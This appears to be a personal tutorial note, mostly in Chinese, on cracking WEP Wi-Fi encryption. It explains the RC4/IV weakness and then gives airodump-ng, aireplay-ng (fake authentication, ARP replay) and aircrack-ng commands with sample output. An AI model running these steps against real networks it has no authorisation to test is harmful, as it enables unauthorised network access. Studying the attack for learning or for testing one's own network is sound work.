# WEP Cracking

### WEP Encryption:

> 可稱: 有線等效加密 (Wired Equivalent Privacy) 或稱 無線加密協議 (Wireless Encryption Protocol)
>
> WEP was included in the original IEEE 802.11 specification adopted in 1989.
>
> It uses the **[RC4](https://paginas.fe.up.pt/~ei10109/ca/rc4.html)** stream cipher for both authentication and encryption.
>

**參考資料: 無線網路加密標準簡介  [iThom](https://www.ithome.com.tw/tech/96292)**

> RC4加密演算法的亂數種子，則是以初始向量（Initialization Vector，IV）和WEP的金鑰所構成，
>
> 但WEP的金鑰是固定不變，IV值則是一組僅有24位元的變動值，並且以明碼的方式傳輸。
>
> 每一次封包的加密，都是透過24位元的IV值與固定的40或104位元WEP金鑰去演算，形成一個64或128位元的RC4加密值，然後傳輸出去。
>
> 但是因為24位元的變動IV值，僅有1,600萬種加密的可能性，在比較繁忙的網路上，這些可能性很快就會被用完，
>
> 這使得有意破解的惡意使用者，只要收集到這數量的封包，就能透過反推算的方式，算出WEP的金鑰。

### 破解方式:

**--> 只要收集到足夠的封包，就能反向算出RC4的金鑰**


### // 1. 收集封包:

```
root@kali:~# airodump-ng --bssid XX:XX:XX:XX:XX:XX --channel 4 --write saveName wlan0
```

### // 2. 若網路不夠繁忙, 使用 airplay-ng 的內建方法增加目標網路生成 new IV 的速度:

**[方法一] Fake Authentication attack - 若網路不夠繁忙, 使用 airplay-ng --fakeauth 發送 request 給目標網路**

```
root@kali:~# aireplay-ng --fakeauth 0[0 是只發送一次, 1 是每一秒發送一次 request] -a xx:xx:xx:xx:xx:xx[目標BSSID] -h xx:xx:xx:xx:xx:xx[自己的BSSID] wlan0
07:02:55  Waiting for beacon frame (BSSID: xx:xx:xx:xx:xx:xx) on channel 4
07:02:55  Sending Authentication Request (Open System) [ACK]
07:02:55  Authentication successful
07:02:55  Sending Association Request [ACK]
07:02:55  Association successful :-) (AID: 1)
```

> 查詢自己的 BSSID:
>
>   `# ifconfig`  -->  找到 unspec 前六碼 (11-22-33-44-55-66)  -->  把 - (dash) 改成 : (冒號)
>

**[方法二] ARP request replay attack - Force the AP to generate new IV**

```
root@kali:~# aireplay-ng --arpreplay -b xx:xx:xx:xx:xx:xx[目標BSSID] -h xx:xx:xx:xx:xx:xx[自己的BSSID] wlan0
07:29:45  Waiting for beacon frame (BSSID: xx:xx:xx:xx:xx:xx) on channel 4
Saving ARP requests in replay_arp-0124-072945.cap
You should also start airodump-ng to capture replies.
Read 18981 packets (got 0 ARP requests and 0 ACKs), sent 0 packets...(0 pps)
 (一直無法啟動攻擊...可能是我只有自己的手機 WAP2 網路可以測試...所以用這個方法可能無效?!)
```

### // 3. 破解密碼: (可以同步 ARP replay Attack 並同步破解...一旦收集到足夠封包, 程式就會自己停止!)

```
root@kali:~# aircrack-ng saveName-01.cap
```
